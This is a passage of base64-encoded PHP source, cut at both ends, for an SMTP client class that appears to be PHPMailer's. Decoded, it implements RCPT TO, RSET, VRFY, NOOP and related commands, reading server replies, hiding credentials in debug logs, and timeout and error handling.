b24gcmVjaXBpZW50KCRhZGRyZXNzLCAkZHNuID0gJycpCiAgewogICAgaWYgKGVtcHR5KCRkc24pKSB7CiAgICAgICRyY3B0ID0gJ1JDUFQgVE86PCcgLiAkYWRkcmVzcyAuICc+JzsKICAgIH0gZWxzZSB7CiAgICAgICRkc24gPSBzdHJ0b3VwcGVyKCRkc24pOwogICAgICAkbm90aWZ5ID0gW107CiAgICAgIGlmIChzdHJwb3MoJGRzbiwgJ05FVkVSJykgIT09IGZhbHNlKSB7CiAgICAgICAgJG5vdGlmeVtdID0gJ05FVkVSJzsKICAgICAgfSBlbHNlIHsKICAgICAgICBmb3JlYWNoIChbJ1NVQ0NFU1MnLCAnRkFJTFVSRScsICdERUxBWSddIGFzICR2YWx1ZSkgewogICAgICAgICAgaWYgKHN0cnBvcygkZHNuLCAkdmFsdWUpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkbm90aWZ5W10gPSAkdmFsdWU7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICB9CiAgICAgICRyY3B0ID0gJ1JDUFQgVE86PCcgLiAkYWRkcmVzcyAuICc+IE5PVElGWT0nIC4gaW1wbG9kZSgnLCcsICRub3RpZnkpOwogICAgfQogICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgKICAgICAgICdSQ1BUIFRPJywKICAgICAgICRyY3B0LAogICAgICAgWzI1MCwgMjUxXQogICAgICk7CiAgfQogIC8qKgogICAqIFNlbmQgYW4gU01UUCBSU0VUIGNvbW1hbmQuCiAgICogQWJvcnQgYW55IHRyYW5zYWN0aW9uIHRoYXQgaXMgY3VycmVudGx5IGluIHByb2dyZXNzLgogICAqIEltcGxlbWVudHMgUkZDIDgyMTogUlNFVCA8Q1JMRj4uCiAgICoKICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBvbiBzdWNjZXNzCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIHJlc2V0KCkKICB7CiAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdSU0VUJywgJ1JTRVQnLCAyNTApOwogIH0KICAvKioKICAgKiBTZW5kIGEgY29tbWFuZCB0byBhbiBTTVRQIHNlcnZlciBhbmQgY2hlY2sgaXRzIHJldHVybiBjb2RlLgogICAqCiAgICogQHBhcmFtIHN0cmluZyAgICAkY29tbWFuZCAgICAgICBUaGUgY29tbWFuZCBuYW1lIC0gbm90IHNlbnQgdG8gdGhlIHNlcnZlcgogICAqIEBwYXJhbSBzdHJpbmcgICAgJGNvbW1hbmRzdHJpbmcgVGhlIGFjdHVhbCBjb21tYW5kIHRvIHNlbmQKICAgKiBAcGFyYW0gaW50fGFycmF5ICRleHBlY3QgICAgICAgIE9uZSBvciBtb3JlIGV4cGVjdGVkIGludGVnZXIgc3VjY2VzcyBjb2RlcwogICAqCiAgICogQHJldHVybiBib29sIFRydWUgb24gc3VjY2VzcwogICAqLwogIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kQ29tbWFuZCgkY29tbWFuZCwgJGNvbW1hbmRzdHJpbmcsICRleHBlY3QpCiAgewogICAgaWYgKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKICAgICAgJHRoaXMtPnNldEVycm9yKCJDYWxsZWQgJGNvbW1hbmQgd2l0aG91dCBiZWluZyBjb25uZWN0ZWQiKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWxsIGNvbW1hbmRzCiAgICBpZiAoc3RycG9zKCRjb21tYW5kc3RyaW5nLCAiXG4iKSAhPT0gZmFsc2Ugb3Igc3RycG9zKCRjb21tYW5kc3RyaW5nLCAiXHIiKSAhPT0gZmFsc2UpIHsKICAgICAgJHRoaXMtPnNldEVycm9yKCJDb21tYW5kICckY29tbWFuZCcgY29udGFpbmVkIGxpbmUgYnJlYWtzIik7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgICR0aGlzLT5jbGllbnRfc2VuZCgkY29tbWFuZHN0cmluZyAuIHN0YXRpYzo6TEUsICRjb21tYW5kKTsKICAgICR0aGlzLT5sYXN0X3JlcGx5ID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgLy8gRmV0Y2ggU01UUCBjb2RlIGFuZCBwb3NzaWJsZSBlcnJvciBjb2RlIGV4cGxhbmF0aW9uCiAgICAkbWF0Y2hlcyA9IFtdOwogICAgaWYgKHByZWdfbWF0Y2goJy9eKFswLTldezN9KVsgLV0oPzooWzAtOV1cXC5bMC05XVxcLlswLTldezEsMn0pICk/LycsICR0aGlzLT5sYXN0X3JlcGx5LCAkbWF0Y2hlcykpIHsKICAgICAgJGNvZGUgPSAkbWF0Y2hlc1sxXTsKICAgICAgJGNvZGVfZXggPSAoY291bnQoJG1hdGNoZXMpID4gMiA/ICRtYXRjaGVzWzJdIDogbnVsbCk7CiAgICAgIC8vIEN1dCBvZmYgZXJyb3IgY29kZSBmcm9tIGVhY2ggcmVzcG9uc2UgbGluZQogICAgICAkZGV0YWlsID0gcHJlZ19yZXBsYWNlKAogICAgICAgICIveyRjb2RlfVsgLV0iIC4KICAgICAgICAoJGNvZGVfZXggPyBzdHJfcmVwbGFjZSgnLicsICdcXC4nLCAkY29kZV9leCkgLiAnICcgOiAnJykgLiAnL20nLAogICAgICAgICcnLAogICAgICAgICR0aGlzLT5sYXN0X3JlcGx5CiAgICAgICk7CiAgICB9IGVsc2UgewogICAgICAvLyBGYWxsIGJhY2sgdG8gc2ltcGxlIHBhcnNpbmcgaWYgcmVnZXggZmFpbHMKICAgICAgJGNvZGUgPSBzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDAsIDMpOwogICAgICAkY29kZV9leCA9IG51bGw7CiAgICAgICRkZXRhaWwgPSBzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDQpOwogICAgfQogICAgJHRoaXMtPmVkZWJ1ZygnU0VSVkVSIC0+IENMSUVOVDogJyAuICR0aGlzLT5sYXN0X3JlcGx5LCBzZWxmOjpERUJVR19TRVJWRVIpOwogICAgaWYgKCFpbl9hcnJheSgkY29kZSwgKGFycmF5KSAkZXhwZWN0KSkgewogICAgICAkdGhpcy0+c2V0RXJyb3IoCiAgICAgICAgIiRjb21tYW5kIGNvbW1hbmQgZmFpbGVkIiwKICAgICAgICAkZGV0YWlsLAogICAgICAgICRjb2RlLAogICAgICAgICRjb2RlX2V4CiAgICAgICk7CiAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgJ1NNVFAgRVJST1I6ICcgLiAkdGhpcy0+ZXJyb3JbJ2Vycm9yJ10gLiAnOiAnIC4gJHRoaXMtPmxhc3RfcmVwbHksCiAgICAgICAgc2VsZjo6REVCVUdfQ0xJRU5UCiAgICAgICk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgICR0aGlzLT5zZXRFcnJvcignJyk7CiAgICByZXR1cm4gdHJ1ZTsKICB9CiAgLyoqCiAgICogU2VuZCBhbiBTTVRQIFNBTUwgY29tbWFuZC4KICAgKiBTdGFydHMgYSBtYWlsIHRyYW5zYWN0aW9uIGZyb20gdGhlIGVtYWlsIGFkZHJlc3Mgc3BlY2lmaWVkIGluICRmcm9tLgogICAqIFJldHVybnMgdHJ1ZSBpZiBzdWNjZXNzZnVsIG9yIGZhbHNlIG90aGVyd2lzZS4gSWYgVHJ1ZQogICAqIHRoZSBtYWlsIHRyYW5zYWN0aW9uIGlzIHN0YXJ0ZWQgYW5kIHRoZW4gb25lIG9yIG1vcmUgcmVjaXBpZW50CiAgICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIGRhdGEgY29tbWFuZC4gVGhpcyBjb21tYW5kCiAgICogd2lsbCBzZW5kIHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKICAgKiBpbiBhbmQgc2VuZCB0aGVtIGFuIGVtYWlsLgogICAqIEltcGxlbWVudHMgUkZDIDgyMTogU0FNTCA8U1A+IEZST006PHJldmVyc2UtcGF0aD4gPENSTEY+LgogICAqCiAgICogQHBhcmFtIHN0cmluZyAkZnJvbSBUaGUgYWRkcmVzcyB0aGUgbWVzc2FnZSBpcyBmcm9tCiAgICoKICAgKiBAcmV0dXJuIGJvb2wKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gc2VuZEFuZE1haWwoJGZyb20pCiAgewogICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnU0FNTCcsICJTQU1MIEZST006JGZyb20iLCAyNTApOwogIH0KICAvKioKICAgKiBTZW5kIGFuIFNNVFAgVlJGWSBjb21tYW5kLgogICAqCiAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBUaGUgbmFtZSB0byB2ZXJpZnkKICAgKgogICAqIEByZXR1cm4gYm9vbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiB2ZXJpZnkoJG5hbWUpCiAgewogICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnVlJGWScsICJWUkZZICRuYW1lIiwgWzI1MCwgMjUxXSk7CiAgfQogIC8qKgogICAqIFNlbmQgYW4gU01UUCBOT09QIGNvbW1hbmQuCiAgICogVXNlZCB0byBrZWVwIGtlZXAtYWxpdmVzIGFsaXZlLCBkb2Vzbid0IGFjdHVhbGx5IGRvIGFueXRoaW5nLgogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIG5vb3AoKQogIHsKICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ05PT1AnLCAnTk9PUCcsIDI1MCk7CiAgfQogIC8qKgogICAqIFNlbmQgYW4gU01UUCBUVVJOIGNvbW1hbmQuCiAgICogVGhpcyBpcyBhbiBvcHRpb25hbCBjb21tYW5kIGZvciBTTVRQIHRoYXQgdGhpcyBjbGFzcyBkb2VzIG5vdCBzdXBwb3J0LgogICAqIFRoaXMgbWV0aG9kIGlzIGhlcmUgdG8gbWFrZSB0aGUgUkZDODIxIERlZmluaXRpb24gY29tcGxldGUgZm9yIHRoaXMgY2xhc3MKICAgKiBhbmQgX21heV8gYmUgaW1wbGVtZW50ZWQgaW4gZnV0dXJlLgogICAqIEltcGxlbWVudHMgZnJvbSBSRkMgODIxOiBUVVJOIDxDUkxGPi4KICAgKgogICAqIEByZXR1cm4gYm9vbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiB0dXJuKCkKICB7CiAgICAkdGhpcy0+c2V0RXJyb3IoJ1RoZSBTTVRQIFRVUk4gY29tbWFuZCBpcyBub3QgaW1wbGVtZW50ZWQnKTsKICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgTk9USUNFOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddLCBzZWxmOjpERUJVR19DTElFTlQpOwogICAgcmV0dXJuIGZhbHNlOwogIH0KICAvKioKICAgKiBTZW5kIHJhdyBkYXRhIHRvIHRoZSBzZXJ2ZXIuCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICRkYXRhICAgIFRoZSBkYXRhIHRvIHNlbmQKICAgKiBAcGFyYW0gc3RyaW5nICRjb21tYW5kIE9wdGlvbmFsbHksIHRoZSBjb21tYW5kIHRoaXMgaXMgcGFydCBvZiwgdXNlZCBvbmx5IGZvciBjb250cm9sbGluZyBkZWJ1ZyBvdXRwdXQKICAgKgogICAqIEByZXR1cm4gaW50fGJvb2wgVGhlIG51bWJlciBvZiBieXRlcyBzZW50IHRvIHRoZSBzZXJ2ZXIgb3IgZmFsc2Ugb24gZXJyb3IKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gY2xpZW50X3NlbmQoJGRhdGEsICRjb21tYW5kID0gJycpCiAgewogICAgLy9JZiBTTVRQIHRyYW5zY3JpcHRzIGFyZSBsZWZ0IGVuYWJsZWQsIG9yIGRlYnVnIG91dHB1dCBpcyBwb3N0ZWQgb25saW5lCiAgICAvL2l0IGNhbiBsZWFrIGNyZWRlbnRpYWxzLCBzbyBoaWRlIGNyZWRlbnRpYWxzIGluIGFsbCBidXQgbG93ZXN0IGxldmVsCiAgICBpZiAoc2VsZjo6REVCVUdfTE9XTEVWRUwgPiAkdGhpcy0+ZG9fZGVidWcgYW5kCiAgICAgIGluX2FycmF5KCRjb21tYW5kLCBbJ1VzZXIgJiBQYXNzd29yZCcsICdVc2VybmFtZScsICdQYXNzd29yZCddLCB0cnVlKSkgewogICAgICAkdGhpcy0+ZWRlYnVnKCdDTElFTlQgLT4gU0VSVkVSOiA8Y3JlZGVudGlhbHMgaGlkZGVuPicsIHNlbGY6OkRFQlVHX0NMSUVOVCk7CiAgICB9IGVsc2UgewogICAgICAkdGhpcy0+ZWRlYnVnKCdDTElFTlQgLT4gU0VSVkVSOiAnIC4gJGRhdGEsIHNlbGY6OkRFQlVHX0NMSUVOVCk7CiAgICB9CiAgICBzZXRfZXJyb3JfaGFuZGxlcihbJHRoaXMsICdlcnJvckhhbmRsZXInXSk7CiAgICAkcmVzdWx0ID0gZndyaXRlKCR0aGlzLT5zbXRwX2Nvbm4sICRkYXRhKTsKICAgIHJlc3RvcmVfZXJyb3JfaGFuZGxlcigpOwogICAgcmV0dXJuICRyZXN1bHQ7CiAgfQogIC8qKgogICAqIEdldCB0aGUgbGF0ZXN0IGVycm9yLgogICAqCiAgICogQHJldHVybiBhcnJheQogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBnZXRFcnJvcigpCiAgewogICAgcmV0dXJuICR0aGlzLT5lcnJvcjsKICB9CiAgLyoqCiAgICogR2V0IFNNVFAgZXh0ZW5zaW9ucyBhdmFpbGFibGUgb24gdGhlIHNlcnZlci4KICAgKgogICAqIEByZXR1cm4gYXJyYXl8bnVsbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBnZXRTZXJ2ZXJFeHRMaXN0KCkKICB7CiAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzOwogIH0KICAvKioKICAgKiBHZXQgbWV0YWRhdGEgYWJvdXQgdGhlIFNNVFAgc2VydmVyIGZyb20gaXRzIEhFTE8vRUhMTyByZXNwb25zZS4KICAgKiBUaGUgbWV0aG9kIHdvcmtzIGluIHRocmVlIHdheXMsIGRlcGVuZGVudCBvbiBhcmd1bWVudCB2YWx1ZSBhbmQgY3VycmVudCBzdGF0ZToKICAgKiAgIDEuIEhFTE8vRUhMTyBoYXMgbm90IGJlZW4gc2VudCAtIHJldHVybnMgbnVsbCBhbmQgcG9wdWxhdGVzICR0aGlzLT5lcnJvci4KICAgKiAgIDIuIEhFTE8gaGFzIGJlZW4gc2VudCAtCiAgICogICAgICRuYW1lID09ICdIRUxPJzogcmV0dXJucyBzZXJ2ZXIgbmFtZQogICAqICAgICAkbmFtZSA9PSAnRUhMTyc6IHJldHVybnMgYm9vbGVhbiBmYWxzZQogICAqICAgICAkbmFtZSA9PSBhbnkgb3RoZXIgc3RyaW5nOiByZXR1cm5zIG51bGwgYW5kIHBvcHVsYXRlcyAkdGhpcy0+ZXJyb3IKICAgKiAgIDMuIEVITE8gaGFzIGJlZW4gc2VudCAtCiAgICogICAgICRuYW1lID09ICdIRUxPJ3wnRUhMTyc6IHJldHVybnMgdGhlIHNlcnZlciBuYW1lCiAgICogICAgICRuYW1lID09IGFueSBvdGhlciBzdHJpbmc6IGlmIGV4dGVuc2lvbiAkbmFtZSBleGlzdHMsIHJldHVybnMgVHJ1ZQogICAqICAgICAgIG9yIGl0cyBvcHRpb25zIChlLmcuIEFVVEggbWVjaGFuaXNtcyBzdXBwb3J0ZWQpLiBPdGhlcndpc2UgcmV0dXJucyBGYWxzZS4KICAgKgogICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgTmFtZSBvZiBTTVRQIGV4dGVuc2lvbiBvciAnSEVMTyd8J0VITE8nCiAgICoKICAgKiBAcmV0dXJuIG1peGVkCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGdldFNlcnZlckV4dCgkbmFtZSkKICB7CiAgICBpZiAoISR0aGlzLT5zZXJ2ZXJfY2FwcykgewogICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIEhFTE8vRUhMTyB3YXMgc2VudCcpOwogICAgICByZXR1cm47CiAgICB9CiAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJG5hbWUsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsKICAgICAgaWYgKCdIRUxPJyA9PSAkbmFtZSkgewogICAgICAgIHJldHVybiAkdGhpcy0+c2VydmVyX2NhcHNbJ0VITE8nXTsKICAgICAgfQogICAgICBpZiAoJ0VITE8nID09ICRuYW1lIHx8IGFycmF5X2tleV9leGlzdHMoJ0VITE8nLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CiAgICAgICR0aGlzLT5zZXRFcnJvcignSEVMTyBoYW5kc2hha2Ugd2FzIHVzZWQ7IE5vIGluZm9ybWF0aW9uIGFib3V0IHNlcnZlciBleHRlbnNpb25zIGF2YWlsYWJsZScpOwogICAgICByZXR1cm47CiAgICB9CiAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzWyRuYW1lXTsKICB9CiAgLyoqCiAgICogR2V0IHRoZSBsYXN0IHJlcGx5IGZyb20gdGhlIHNlcnZlci4KICAgKgogICAqIEByZXR1cm4gc3RyaW5nCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RSZXBseSgpCiAgewogICAgcmV0dXJuICR0aGlzLT5sYXN0X3JlcGx5OwogIH0KICAvKioKICAgKiBSZWFkIHRoZSBTTVRQIHNlcnZlcidzIHJlc3BvbnNlLgogICAqIEVpdGhlciBiZWZvcmUgZW9mIG9yIHNvY2tldCB0aW1lb3V0IG9jY3VycyBvbiB0aGUgb3BlcmF0aW9uLgogICAqIFdpdGggU01UUCB3ZSBjYW4gdGVsbCBpZiB3ZSBoYXZlIG1vcmUgbGluZXMgdG8gcmVhZCBpZiB0aGUKICAgKiA0dGggY2hhcmFjdGVyIGlzICctJyBzeW1ib2wuIElmIGl0IGlzIGEgc3BhY2UgdGhlbiB3ZSBkb24ndAogICAqIG5lZWQgdG8gcmVhZCBhbnl0aGluZyBlbHNlLgogICAqCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0X2xpbmVzKCkKICB7CiAgICAvLyBJZiB0aGUgY29ubmVjdGlvbiBpcyBiYWQsIGdpdmUgdXAgc3RyYWlnaHQgYXdheQogICAgaWYgKCFpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgewogICAgICByZXR1cm4gJyc7CiAgICB9CiAgICAkZGF0YSA9ICcnOwogICAgJGVuZHRpbWUgPSAwOwogICAgc3RyZWFtX3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sICR0aGlzLT5UaW1lb3V0KTsKICAgIGlmICgkdGhpcy0+VGltZWxpbWl0ID4gMCkgewogICAgICAkZW5kdGltZSA9IHRpbWUoKSArICR0aGlzLT5UaW1lbGltaXQ7CiAgICB9CiAgICAkc2VsUiA9IFskdGhpcy0+c210cF9jb25uXTsKICAgICRzZWxXID0gbnVsbDsKICAgIHdoaWxlIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSBhbmQgIWZlb2YoJHRoaXMtPnNtdHBfY29ubikpIHsKICAgICAgLy9NdXN0IHBhc3MgdmFycyBpbiBoZXJlIGFzIHBhcmFtcyBhcmUgYnkgcmVmZXJlbmNlCiAgICAgIGlmICghc3RyZWFtX3NlbGVjdCgkc2VsUiwgJHNlbFcsICRzZWxXLCAkdGhpcy0+VGltZWxpbWl0KSkgewogICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAnU01UUCAtPiBnZXRfbGluZXMoKTogdGltZWQtb3V0ICgnIC4gJHRoaXMtPlRpbWVvdXQgLiAnIHNlYyknLAogICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgICApOwogICAgICAgIGJyZWFrOwogICAgICB9CiAgICAgIC8vRGVsaWJlcmF0ZSBub2lzZSBzdXBwcmVzc2lvbiAtIGVycm9ycyBhcmUgaGFuZGxlZCBhZnRlcndhcmRzCiAgICAgICRzdHIgPSBAZmdldHMoJHRoaXMtPnNtdHBfY29ubiwgNTE1KTsKICAgICAgJHRoaXMtPmVkZWJ1ZygnU01UUCBJTkJPVU5EOiAiJyAuIHRyaW0oJHN0cikgLiAnIicsIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsKICAgICAgJGRhdGEgLj0gJHN0cjsKICAgICAgLy8gSWYgcmVzcG9uc2UgaXMgb25seSAzIGNoYXJzIChub3QgdmFsaWQsIGJ1dCBSRkM1MzIxIFM0LjIgc2F5cyBpdCBtdXN0IGJlIGhhbmRsZWQpLAogICAgICAvLyBvciA0dGggY2hhcmFjdGVyIGlzIGEgc3BhY2UsIHdlIGFyZSBkb25lIHJlYWRpbmcsIGJyZWFrIHRoZSBsb29wLAogICAgICAvLyBzdHJpbmcgYXJyYXkgYWNjZXNzIGlzIGEgbWljcm8tb3B0aW1pc2F0aW9uIG92ZXIgc3RybGVuCiAgICAgIGlmICghaXNzZXQoJHN0clszXSkgb3IgKGlzc2V0KCRzdHJbM10pIGFuZCAkc3RyWzNdID09ICcgJykpIHsKICAgICAgICBicmVhazsKICAgICAgfQogICAgICAvLyBUaW1lZC1vdXQ/IExvZyBhbmQgYnJlYWsKICAgICAgJGluZm8gPSBzdHJlYW1fZ2V0X21ldGFfZGF0YSgkdGhpcy0+c210cF9jb25uKTsKICAgICAgaWYgKCRpbmZvWyd0aW1lZF9vdXQnXSkgewogICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAnU01UUCAtPiBnZXRfbGluZXMoKTogdGltZWQtb3V0ICgnIC4gJHRoaXMtPlRpbWVvdXQgLiAnIHNlYyknLAogICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgICApOwogICAgICAgIGJyZWFrOwogICAgICB9CiAgICAgIC8vIE5vdyBjaGVjayBpZiByZWFkcyB0b29rIHRvbyBsb25nCiAgICAgIGlmICgkZW5kdGltZSBhbmQgdGltZSgpID4gJGVuZHRpbWUpIHsKICAgICAgICAkdGhpcy0+ZWRlYnVnKAogICAgICAgICAgJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHRpbWVsaW1pdCByZWFjaGVkICgnIC4KICAgICAgICAgICR0aGlzLT5UaW1lbGltaXQgLiAnIHNlYyknLAogICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgICApOwogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICByZXR1cm4gJGRhdGE7CiAgfQogIC8qKgogICAqIEVuYWJsZSBvciBkaXNhYmxlIFZFUlAgYWRkcmVzcyBnZW5lcmF0aW9uLgogICAqCiAgICogQHBhcmFtIGJvb2wgJGVuYWJsZWQKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gc2V0VmVycCgkZW5hYmxlZCA9IGZhbHNlKQogIHsKICAgICR0aGlzLT5kb192ZXJwID0gJGVuYWJsZWQ7CiAgfQogIC8qKgogICAqIEdldCBWRVJQIGFkZHJlc3MgZ2VuZXJhdGlvbiBtb2RlLgogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGdldFZlcnAoKQogIHsKICAgIHJldHVybiAkdGhpcy0+ZG9fdmVycDsKICB9CiAgLyoqCiAgICogU2V0IGVycm9yIG1lc3NhZ2VzIGFuZCBjb2Rlcy4KICAgKgogICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgICAgICBUaGUgZXJyb3IgbWVzc2FnZQogICAqIEBwYXJhbSBzdHJpbmcgJGRldGFpbCAgICAgICBGdXJ0aGVyIGRldGFpbCBvbiB0aGUgZXJyb3IKICAgKiBAcGFyYW0gc3RyaW5nICRzbXRwX2NvZGUgICAgQW4gYXNzb2NpYXRlZCBTTVRQIGVycm9yIGNvZGUKICAgKiBAcGFyYW0gc3RyaW5nICRzbXRwX2NvZGVfZXggRXh0ZW5kZWQgU01UUCBjb2RlCiAgICovCiAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldEVycm9yKCRtZXNzYWdlLCAkZGV0YWlsID0gJycsICRzbXRwX2NvZGUgPSAnJywgJHNtdHBfY29kZV9leCA9ICcnKQogIHsKICAgICR0aGlzLT5lcnJvciA9IFsKICAgICAgJ2Vycm9yJyA9PiAkbWVzc2FnZSwKICAgICAgJ2RldGFpbCcgPT4gJGRldGFpbCwKICAgICAgJ3NtdHBfY29kZScgPT4gJHNtdHBfY29kZSwKICAgICAgJ3NtdHBfY29kZV9leCcgPT4gJHNtdHBfY29kZV9leCwKICAgIF07CiAgfQogIC8qKgogICAqIFNldCBkZWJ1ZyBvdXRwdXQgbWV0aG9kLgogICAqCiAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkbWV0aG9kIFRoZSBuYW1lIG9mIHRoZSBtZWNoYW5pc20gdG8gdXNlIGZvciBkZWJ1Z2dpbmcgb3V0cHV0LCBvciBhIGNhbGxhYmxlIHRvIGhhbmRsZSBpdAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z091dHB1dCgkbWV0aG9kID0gJ2VjaG8nKQogIHsKICAgICR0aGlzLT5EZWJ1Z291dHB1dCA9ICRtZXRob2Q7CiAgfQogIC8qKgogICAqIEdldCBkZWJ1ZyBvdXRwdXQgbWV0aG9kLgogICAqCiAgICogQHJldHVybiBzdHJpbmcKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdPdXRwdXQoKQogIHsKICAgIHJldHVybiAkdGhpcy0+RGVidWdvdXRwdXQ7CiAgfQogIC8qKgogICAqIFNldCBkZWJ1ZyBvdXRwdXQgbGV2ZWwuCiAgICoKICAgKiBAcGFyYW0gaW50ICRsZXZlbAogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z0xldmVsKCRsZXZlbCA9IDApCiAgewogICAgJHRoaXMtPmRvX2RlYnVnID0gJGxldmVsOwogIH0KICAvKioKICAgKiBHZXQgZGVidWcgb3V0cHV0IGxldmVsLgogICAqCiAgICogQHJldHVybiBpbnQKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdMZXZlbCgpCiAgewogICAgcmV0dXJuICR0aGlzLT5kb19kZWJ1ZzsKICB9CiAgLyoqCiAgICogU2V0IFNNVFAgdGltZW91dC4KICAgKgogICAqIEBwYXJhbSBpbnQgJHRpbWVvdXQgVGhlIHRpbWVvdXQgZHVyYXRpb24gaW4gc2Vjb25kcwogICAqLwogIHB1YmxpYyBmdW5jdGlvbiBzZXRUaW1lb3V0KCR0aW1lb3V0ID0gMCkKICB7CiAgICAkdGhpcy0+VGltZW91dCA9ICR0aW1lb3V0OwogIH0KICAvKioKICAgKiBHZXQgU01UUCB0aW1lb3V0LgogICAqCiAgICogQHJldHVybiBpbnQKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gZ2V0VGltZW91dCgpCiAgewogICAgcmV0dXJuICR0aGlzLT5UaW1lb3V0OwogIH0KICAvKioKICAgKiBSZXBvcnRzIGFuIGVycm9yIG51bWJlciBhbmQgc3RyaW5nLgogICAqCiAgICogQHBhcmFtIGludCAgICAkZXJybm8gICBUaGUgZXJyb3IgbnVtYmVyIHJldHVybmVkIGJ5IFBIUAogICAqIEBwYXJhbSBzdHJpbmcgJGVycm1zZyAgVGhlIGVycm9yIG1lc3NhZ2UgcmV0dXJuZWQgYnkgUEhQCiAgICogQHBhcmFtIHN0cmluZyAkZXJyZmlsZSBUaGUgZmlsZSB0aGUgZXJyb3Igb2NjdXJyZWQgaW4KICAgKiBAcGFyYW0gaW50ICAgICRlcnJsaW5lIFRoZSBsaW5lIG51bWJlciB0aGUgZXJyb3Igb2NjdXJyZWQgb24KICAgKi8KICBwcm90ZWN0ZWQgZnVuY3Rpb24gZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZywgJGVycmZpbGUgPSAnJywgJGVycmxpbmUgPSAwKQogIHsKICAgICRub3RpY2UgPSAnQ29ubmVjdGlvbiBmYWlsZWQuJzsKICAgICR0aGlzLT5zZXRFcnJvcigKICAgICAgJG5vdGljZSwKICAgICAgJGVycm1zZywKICAgICAgKHN0cmluZykgJGVycm5vCiAgICApOwogICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgIiRub3RpY2UgRXJyb3IgIyRlcnJubzogJGVycm1zZyBbJGVycmZpbGUgbGluZSAkZXJybGluZV0iLAogICAgICBzZWxmOjpERUJVR19DT05ORUNUSU9OCiAgICApOwogIH0KICAvKioKICAgKiBFeHRyYWN0IGFuZCByZXR1cm4gdGhlIElEIG9mIHRoZSBsYXN0IFNNVFAgdHJhbnNhY3Rpb24gYmFzZWQgb24KICAgKiBhIGxpc3Qgb2YgcGF0dGVybnMgcHJvdmlkZWQgaW4gU01UUDo6JHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMuCiAgICogUmVsaWVzIG9uIHRoZSBob3N0IHByb3ZpZGluZyB0aGUgSUQgaW4gcmVzcG9uc2UgdG8gYSBEQVRBIGNvbW1hbmQuCiAgICogSWYgbm8gcmVwbHkgaGFzIGJlZW4gcmVjZWl2ZWQgeWV0LCBpdCB3aWxsIHJldHVybiBudWxsLgogICAqIElmIG5vIHBhdHRlcm4gd2FzIG1hdGNoZWQsIGl0IHdpbGwgcmV0dXJuIGZhbHNlLgogICAqCiAgICogQHJldHVybiBib29sfG51bGx8c3R